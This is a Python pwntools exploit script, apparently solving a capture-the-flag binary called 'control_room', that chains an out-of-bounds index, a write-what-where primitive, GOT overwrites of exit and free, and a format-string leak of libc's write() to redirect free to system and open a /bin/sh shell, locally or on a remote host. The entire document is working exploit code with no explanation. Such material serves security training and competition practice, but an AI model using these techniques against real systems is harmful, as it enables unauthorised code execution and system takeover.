#!/usr/bin/env python3

from pwn import *
from typing import Tuple

context.binary = elf = ELF('control_room')
glibc = ELF('libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1].split(':')
    return remote(host, port)


def write_what_where(p, what: Tuple[int, int], where: int):
    p.sendlineafter(b'Option [1-5]: ', b'1')
    p.sendlineafter(b'Engine number [0-3]: ', str((where - elf.sym.engines) // 16).encode())
    p.sendlineafter(b'Thrust: ', str(what[0]).encode())
    p.sendlineafter(b'Mixture ratio: ', str(what[1]).encode())
    p.sendlineafter(b'Do you want to save the configuration? (y/n) \n> ', b'y')


def main():
    p = get_process()

    p.sendlineafter(b'Enter a username: ', b'A' * 256)
    p.sendlineafter(b'New username size: ', b'256')
    p.sendlineafter(b'Enter your new username: ', b'asdf')

    p.sendlineafter(b'Option [1-5]: ', b'5')
    p.sendlineafter(b'New role: ', b'1')


    p.sendlineafter(b'Option [1-5]: ', b'1')
    p.sendlineafter(b'Engine number [0-3]: ', b'9\n')
    p.sendlineafter(b'Do you want to save the configuration? (y/n) \n> ', b'y')
    stack_leak = u64(p.recvuntil(b'\x7f', timeout=1)[-6:].ljust(8, b'\0'))
    p.info(f'Leaked stack address: {hex(stack_leak)}')

    write_what_where(p, (elf.sym.user_edit, elf.sym.user_edit), elf.got.exit)
    write_what_where(p, (elf.plt.printf, elf.plt.printf), elf.got.free)
    p.sendlineafter(b'Option [1-5]: ', b'0')

    p.sendlineafter(b'New username size: ', b'200')
    p.sendlineafter(b'Enter your new username: ', b'%3$lx')

    p.recvuntil(b'User updated successfully!\n\n')
    write_addr = int(p.recvline().decode()[:12], 16) - 23
    p.info(f'Leaked write() address: {hex(write_addr)}')

    glibc.address = write_addr - glibc.sym.write
    p.success(f'Glibc base address: {hex(glibc.address)}')

    write_what_where(p, (glibc.sym.system, glibc.sym.system), elf.got.free)
    p.sendlineafter(b'Option [1-5]: ', b'0')
    p.sendlineafter(b'New username size: ', b'200')
    p.sendlineafter(b'Enter your new username: ', b'/bin/sh\0')

    p.recv()
    p.interactive()


if __name__ == '__main__':
    main()
